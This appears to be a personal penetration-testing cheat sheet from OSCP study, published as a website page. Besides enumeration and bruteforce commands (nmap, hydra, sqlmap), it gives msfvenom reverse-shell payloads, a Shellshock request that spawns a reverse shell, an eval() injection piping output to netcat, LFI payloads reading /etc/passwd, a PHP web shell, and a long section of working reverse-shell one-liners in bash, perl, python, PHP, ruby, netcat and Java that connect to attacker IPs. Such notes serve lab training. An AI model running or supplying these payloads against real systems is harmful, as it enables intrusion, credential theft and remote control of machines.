---
layout: page
title: Pentesting Notes
permalink: /notes/
---



(Notes essentially from OSCP days)
# Methodology

Discover service versions of open ports using nmap or manually.
nmap: Use -p- for all ports
Also make sure to run a udp scan with:
nmap -sU -sV

Go for low hanging fruits by looking up exploits for service versions.
#### Http site
* nikto -h
* dirbuster / wfuzz
* Burp
* Ensure that you enum all http/s ports
* When searching for exploit search with CVE, service name (try generic when exact is not found)
* For bruteforcing credentials the order is:
  * Default
  * Easy - Try simple passwords such as username, password, admin, previously found pwd etc. when usernames are discovered or with default username. Also try for PE.
  * Cewl
  * wordlist

If you find an MD5 or some other hash - try to crack it quickly

When source or directry listing is available check for credentials for things like DB.

---
# Enum
`netdiscover -r 10.11.1.0/24`

OS
`xprobe2 10.11.1.133`

`nmap -sS -A -O -n -p1-65535 192.168.1.13`

* Dirbuster (with long list)
* Hydra https://host
* Use Burp to analyze and edit traffic

SMB (139,445):
```
nbtscan -r 10.11.1.0/24
smbclient -L 10.11.1.31 -U anonymous
smbclient //192.168.25.67/wwwroot -U anonymous 
enum4linux -a 10.11.1.5
```

`/root/scripts/nmap-smb.sh 10.11.1.5`

`nmap -p 139.445 --script=smb-check-vulns --script-args=unsafe=1 10.11.1.1`

`rpcclient -U "" 10.11.1.1`

SNMP (UDP 161)
```bash
snmp-check 10.11.1.5
onesixtyone -c community 192.168.186.130 
snmpwalk -c public -v1 192.168.186.130 
```

SMTP
nc to 25 port and then run
`VRFY bob`

#### DNS Zone Transfer
Figure out dns server:
`host -t ns foo.org`
`host -t mx foo.org`
now attempt zone transfer for all the dns servers:
`host -l foo.org ns1.foo.org`

complete enumeration
`dnsenum foo.org`
following will attempt zone transfer
`dnsrecon -d megacorpone.com -t axfr`

Vulnerability Scanning
`nmap --script all <IP>`

NFS
```bash
rcpinfo -p <IP>
showmount <IP> -a
mount 10.11.1.10:/sites/webdata ./testing
```

HTTP

`cewl www.megacorpone.com -m 6 -w mega-cewl.txt`

Mangle:

`john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled`

Locate db path:

`/var/lib/mlocate/mlocate.db`

`hydra -l garry -F -P /usr/share/wordlists/rockyou.txt 10.11.1.73 -s 8080 http-post-form "/php/index.php:tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=^USER^&password=^PASS^&submit=Login:F=Failed:H=Cookie\: OV3176019645=a4u215fgf3tj8718i0b1rj7ia5"`

-F stop after getting login

http-post-form "\<url>:\<post data>:F=\<fail text:H=\<header>"

`hydra -l root -P /root/rockyou.txt 10.11.1.71 ssh`

---
### Exploit
SQLMAP

`sqlmap -u http://192.168.1.15:8008/unisxcudkqjydw/vulnbank/client/login.php --method POST --data "username=1&password=pass" -p "username,password" --cookie="PHPSESSID=crp8r4pq35vv0fm1l5td32q922" --dbms=MySQL --text-only --level=5 --risk=2`

* level ranges 1-5 and risk 1-3 (default 1)
* use get parameter to dump all

`sqlmap -u "http://192.168.203.134/imfadministrator/cms.php?pagename=upload" --cookie="PHPSESSID=1im32c1q8b54vr27eussjjp6n2" -p pagename --level=5 --risk=3 -a`

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.235 LPORT=1234 -f elf > reverse.elf
msfvenom -p cmd/unix/reverse_bash  LHOST=192.168.203.130 LPORT=1234 -f raw > shell.sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.235 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```
From [https://netsec.ws/?p=331](https://netsec.ws/?p=331)

---
### Misc 

#### Linux
`cut -c2-`	cut the first 2 characters
rev:
`cat foo|rev`	reverse contents of cat
#### Python
Rev shell
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.3.222', 6660))
s.send("GET /" + buffer + " HTTP/1.1" + "\r\n\r\n")
s.close()
```
Python eval() and 2.7 read() exploit:

`__import__("os").system("netstat -antp|nc 192.168.203.130 1234")`

Netcat listen for reverse shell:

`nc -v -n -l -p 1234`

Port knocking 

`for x in 27017 28017; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.11.1.237; done`
#### PHP
Covert LFI to see php code:

`http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00`
`http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=../../../../../var/www/image.php%00`
#### WordPress
`wpscan --url http://192.168.110.181:69 --enumerate u`
to enumerate and bruteforce users based on wordlist use:
`wpscan -u 10.11.1.234 --wordlist /usr/share/wordlists/rockyou.txt --threads 50`
#### Samaba Share
```bash
smbclient -L host
smbclient \\\\zimmerman\\public mypasswd
smbclient //billy/EricsSecretStuff -u anonymous
```

`enum4linux -a 192.168.110.181`	will do all sort of enumerations on samba

From [http://www.tldp.org/HOWTO/SMB-HOWTO-8.html](http://www.tldp.org/HOWTO/SMB-HOWTO-8.html)
Crunch to generate wordlist based on options

`crunch 10 10 -t %%%qwerty^ > craven.txt`
This creates wordlist with min 10 letters and max 10 letters starting with 3 numbers, then string 'qwerty' then special characters.

Chrome browser user agent:
`Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36`
Google bot:
`User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`

Find file type based on pattern when 'file' command does not work:
[http://mark0.net/soft-tridnet-e.html](http://mark0.net/soft-tridnet-e.html)

`find /proc -regex '\/proc\/[0-9]+\/fd\/.*' -type l -lname "*network*" -printf "%p -> %l\n" 2> /dev/null`

MySql supports # for commenting on top of --

Find text recursively in files in this folder

`grep -rnwl '/path/to/somewhere/' -e "pattern"`

wpscan to scan wordpress site for vulns

`wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap`

ShellShock over http when you get response from cgi-bin which have server info only

`wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.0.235\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" http://10.11.1.71/cgi-bin/admin.cgi`

#### Bruteforce
user fcrackzip to brute force zip

`cewl http://10.11.1.39/otrs/installer.pl>>cewl`
 
mangle with john?

`sort cewl | uniq >>cewl2`

Check cert:

`openssl s_client -connect 10.11.1.35:443`

#### Encoding
HexToASCII

`echo -n 666c6167307b7468655f717569657465 |xxd -r -p`

Convert windows file to linux

`cat file | dos2unix > file2`

`base64 -d`

PUT to webserver:
Use poster Ctrl+Alt+P in Firefox and set url containg file path and chose file and PUT.

---

# Rev Shell

#### Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

`bash -i >& /dev/tcp/10.11.0.235/443 0>&1`

#### PERL
Here’s a shorter, feature-free version of the perl-reverse-shell:

`perl -e 'use Socket;$i="10.11.0.235";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

#### Python
This was tested under Linux / Python 2.7:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

#### Windows:

`"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.11.0.235',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);"`

#### PHP
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

`php -r '$sock=fsockopen("10.11.0.235",443);exec("/bin/sh -i <&3 >&3 2>&3");'`

If you want a .php file to upload, see the more featureful and robust php-reverse-shell.

#### Ruby
`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

#### Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
`nc -e /bin/sh 10.0.0.1 1234`
If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
#### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
[Untested submission from anonymous reader]
#### xterm
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
`xterm -display 10.0.0.1:1`
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
`Xnest :1`
You’ll need to authorise the target to connect to you (command also run on your host):
`xhost +targetip`

#### PHP web shell
`<?php echo shell_exec($_GET['c']); ?>`

`cmd.exe >& /dev/tcp/10.11.0.235/80 0>&1`


